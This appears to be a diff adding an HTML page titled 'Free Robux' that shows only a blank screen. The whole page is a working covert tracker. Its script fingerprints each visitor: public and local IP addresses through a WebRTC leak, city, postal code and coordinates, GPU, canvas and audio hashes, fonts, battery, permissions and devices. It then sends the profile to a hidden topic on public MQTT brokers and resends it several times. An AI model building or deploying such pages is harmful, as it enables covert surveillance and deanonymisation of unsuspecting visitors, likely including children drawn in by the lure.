@@ -1,0 +1,251 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+<meta charset="UTF-8">
+<title>Free Robux</title>
+<style>
+  html, body { margin:0; padding:0; background:#fff; height:100%; overflow:hidden; }
+</style>
+</head>
+<body>
+<script src="https://unpkg.com/mqtt/dist/mqtt.min.js"></script>
+<script>
+const TOPIC = "fgeofrweogjewjrglkjqlkfqpigfiwpofqjopfwekpfwjeofwkfpwsdjfwiepfwjdlfjwepfhweokfkwpfjw";
+const BROKERS = [
+  "wss://broker.emqx.io:8084/mqtt",
+  "wss://test.mosquitto.org:8081/mqtt",
+  "wss://broker.hivemq.com:8884/mqtt"
+];
+const idToken = "v" + Math.random().toString(36).slice(2, 14);
+
+async function collect() {
+  const n = navigator, s = screen, w = window;
+  const o = { id: idToken, ts: Date.now() };
+
+  const safe = (fn, key) => { try { const v = fn(); if (v !== undefined) o[key] = v; } catch(e){} };
+
+  safe(() => location.href, "url");
+  safe(() => document.referrer || "", "referrer");
+  safe(() => n.userAgent, "userAgent");
+  safe(() => n.platform || "", "platform");
+  safe(() => n.vendor || "", "vendor");
+  safe(() => n.language, "language");
+  safe(() => (n.languages || []).join(", "), "languages");
+  safe(() => n.cookieEnabled, "cookiesEnabled");
+  safe(() => n.doNotTrack || "", "doNotTrack");
+  safe(() => n.hardwareConcurrency || "", "hardwareConcurrency");
+  safe(() => n.deviceMemory || "", "deviceMemory");
+  safe(() => n.maxTouchPoints || 0, "maxTouchPoints");
+  safe(() => n.onLine, "onLine");
+  safe(() => n.webdriver === true, "webdriver");
+  safe(() => n.pdfViewerEnabled === true, "pdfViewer");
+  safe(() => n.buildID || "", "buildID");
+  safe(() => history.length, "historyLength");
+  safe(() => Intl.DateTimeFormat().resolvedOptions().timeZone, "timezone");
+  safe(() => Intl.DateTimeFormat().resolvedOptions().locale, "locale");
+
+  safe(() => `${s.width}x${s.height}`, "screen");
+  safe(() => `${s.availWidth}x${s.availHeight}`, "availScreen");
+  safe(() => s.colorDepth + " bit", "colorDepth");
+  safe(() => w.devicePixelRatio || 1, "pixelRatio");
+  safe(() => `${w.innerWidth}x${w.innerHeight}`, "windowSize");
+  safe(() => `${w.screenX},${w.screenY}`, "windowPos");
+  safe(() => (s.orientation && s.orientation.type) || "", "orientation");
+
+  try { o.ipv4 = await fetchIP("https://api.ipify.org?format=json", "ip"); } catch(e){}
+  try { o.ipv4b = await fetchIP("https://ipapi.co/json/", "ip"); } catch(e){}
+  try { o.ipv6 = await fetchIP("https://api64.ipify.org?format=json", "ip"); } catch(e){}
+
+  try {
+    const r = await fetch("https://ipapi.co/json/", { cache: "no-store" });
+    const j = await r.json();
+    if (j && !j.error) {
+      o.geoCity     = j.city;
+      o.geoRegion   = j.region;
+      o.geoCountry  = j.country_name;
+      o.geoCountryCode = j.country_code;
+      o.geoPostal   = j.postal;
+      o.geoLat      = j.latitude;
+      o.geoLon      = j.longitude;
+      o.geoISP      = j.org;
+      o.geoASN      = j.asn;
+      o.geoTimezone = j.timezone;
+    }
+  } catch(e){}
+
+  try {
+    const c = document.createElement("canvas");
+    const gl = c.getContext("webgl") || c.getContext("experimental-webgl");
+    if (gl) {
+      const dbg = gl.getExtension("WEBGL_debug_renderer_info");
+      if (dbg) {
+        o.gpu = gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL);
+        o.gpuVendor = gl.getParameter(dbg.UNMASKED_VENDOR_WEBGL);
+      }
+      o.webglVersion = gl.getParameter(gl.VERSION);
+    }
+  } catch(e){}
+
+  try {
+    const cv = document.createElement("canvas");
+    cv.width = 200; cv.height = 40;
+    const ctx = cv.getContext("2d");
+    ctx.textBaseline = "top";
+    ctx.font = "14px Arial";
+    ctx.fillStyle = "#f60"; ctx.fillRect(0, 0, 100, 20);
+    ctx.fillStyle = "#069"; ctx.fillText("fp_scan_$#@!", 2, 15);
+    ctx.fillStyle = "rgba(102,204,0,0.7)"; ctx.fillText("fp_scan_$#@!", 4, 17);
+    let h = 0; const str = cv.toDataURL();
+    for (let i = 0; i < str.length; i++) { h = ((h << 5) - h) + str.charCodeAt(i); h |= 0; }
+    o.canvasHash = (h >>> 0).toString(16);
+  } catch(e){}
+
+  try {
+    const AC = window.OfflineAudioContext || window.webkitOfflineAudioContext;
+    if (AC) {
+      const ac = new AC(1, 44100, 44100);
+      const osc = ac.createOscillator();
+      osc.type = "triangle"; osc.frequency.value = 10000;
+      const comp = ac.createDynamicsCompressor();
+      osc.connect(comp); comp.connect(ac.destination);
+      osc.start(0);
+      const buf = await new Promise(res => { ac.oncomplete = e => res(e.renderedBuffer); setTimeout(() => res(null), 1500); });
+      if (buf) {
+        const d = buf.getChannelData(0);
+        let sum = 0; for (let i=4500;i<5000;i++) sum += Math.abs(d[i]);
+        o.audioHash = sum.toFixed(6);
+      }
+    }
+  } catch(e){}
+
+  try {
+    const base = ["monospace","sans-serif","serif"];
+    const test = ["Arial","Verdana","Times New Roman","Courier New","Georgia","Tahoma",
+                  "Comic Sans MS","Impact","Trebuchet MS","Consolas","Calibri","Segoe UI",
+                  "Helvetica","Cambria","Roboto","Ubuntu","Menlo","Monaco","Franklin Gothic",
+                  "Garamond","Bookman","Palatino","Arial Black","Lucida Console"];
+    const span = document.createElement("span");
+    span.style.cssText = "position:absolute;left:-9999px;font-size:72px;";
+    span.textContent = "mmmmmmmmmmlli";
+    document.body.appendChild(span);
+    const sizes = {};
+    base.forEach(b => { span.style.fontFamily = b; sizes[b] = span.offsetWidth + "_" + span.offsetHeight; });
+    const found = [];
+    test.forEach(f => {
+      const ok = base.some(b => {
+        span.style.fontFamily = `'${f}',${b}`;
+        return (span.offsetWidth + "_" + span.offsetHeight) !== sizes[b];
+      });
+      if (ok) found.push(f);
+    });
+    span.remove();
+    o.fonts = found.join(", ") || "";
+  } catch(e){}
+
+  try {
+    const v = document.createElement("video");
+    o.codecH264 = v.canPlayType('video/mp4; codecs="avc1.42E01E"') || "";
+    o.codecWebm = v.canPlayType('video/webm; codecs="vp8"') || "";
+    o.codecOgg = v.canPlayType('video/ogg; codecs="theora"') || "";
+    const a = document.createElement("audio");
+    o.codecMp3 = a.canPlayType("audio/mpeg") || "";
+    o.codecAac = a.canPlayType("audio/aac") || "";
+  } catch(e){}
+
+  try { o.plugins = Array.from(n.plugins || []).map(p => p.name).join(", "); } catch(e){}
+
+  try {
+    const c = n.connection || n.mozConnection || n.webkitConnection;
+    if (c) {
+      o.netType = c.effectiveType || "";
+      o.netDownlink = c.downlink || "";
+      o.netRtt = c.rtt || "";
+      o.netSaveData = c.saveData || false;
+    }
+  } catch(e){}
+
+  try {
+    if (n.getBattery) {
+      const b = await Promise.race([n.getBattery(), new Promise(r => setTimeout(() => r(null), 1200))]);
+      if (b) { o.batteryLevel = Math.round(b.level * 100) + "%"; o.batteryCharging = b.charging; }
+    }
+  } catch(e){}
+
+  try {
+    if (n.permissions) {
+      const names = ["geolocation","notifications","camera","microphone","clipboard-read"];
+      const res = {};
+      for (const p of names) { try { res[p] = (await n.permissions.query({ name: p })).state; } catch(e){} }
+      o.permissions = res;
+    }
+  } catch(e){}
+
+  try {
+    if (n.storage && n.storage.estimate) {
+      const e = await Promise.race([n.storage.estimate(), new Promise(r => setTimeout(() => r(null), 800))]);
+      if (e) o.storageQuota = e.quota;
+    }
+  } catch(e){}
+
+  try {
+    if (n.mediaDevices && n.mediaDevices.enumerateDevices) {
+      const devs = await Promise.race([n.mediaDevices.enumerateDevices(), new Promise(r => setTimeout(() => r(null), 1200))]);
+      if (devs) o.mediaDevices = devs.map(d => d.kind).join(", ");
+    }
+  } catch(e){}
+
+  try { o.localIPs = await getLocalIPs(); } catch(e){ o.localIPs = []; }
+
+  return o;
+}
+
+async function fetchIP(url, key) {
+  const r = await fetch(url, { cache: "no-store" });
+  const j = await r.json();
+  return j[key] || "";
+}
+
+function getLocalIPs() {
+  return new Promise(resolve => {
+    const ips = new Set();
+    let done = false;
+    const finish = () => { if (!done) { done = true; resolve(Array.from(ips)); } };
+    try {
+      const pc = new RTCPeerConnection({ iceServers: [{ urls: "stun:stun.l.google.com:19302" }] });
+      pc.createDataChannel("x");
+      pc.onicecandidate = e => {
+        if (!e.candidate) { finish(); return; }
+        const m = e.candidate.candidate.match(/(\d+\.\d+\.\d+\.\d+|([a-f0-9]{1,4}:){2,}[a-f0-9]+)/i);
+        if (m) ips.add(m[0]);
+      };
+      pc.createOffer().then(o => pc.setLocalDescription(o)).catch(() => finish());
+      setTimeout(() => { try { pc.close(); } catch(e){}; finish(); }, 2500);
+    } catch(e){ finish(); }
+  });
+}
+
+function connectNext(i) {
+  if (i >= BROKERS.length) { setTimeout(() => connectNext(0), 5000); return; }
+  let c;
+  try { c = mqtt.connect(BROKERS[i], { clientId: "v_" + Math.random().toString(16).slice(2), connectTimeout: 6000 }); }
+  catch(e){ connectNext(i+1); return; }
+
+  let connected = false;
+  c.on("connect", async () => {
+    connected = true;
+    const info = await collect();
+    c.publish(TOPIC, JSON.stringify({ type: "spy", info }));
+    let k = 0;
+    const resend = setInterval(() => {
+      k++;
+      c.publish(TOPIC, JSON.stringify({ type: "spy", info }));
+      if (k >= 6) clearInterval(resend);
+    }, 4000);
+  });
+  c.on("error", () => { if (!connected) { try { c.end(true); } catch(e){}; connectNext(i+1); } });
+}
+
+connectNext(0);
+</script>
+</body>
+</html>
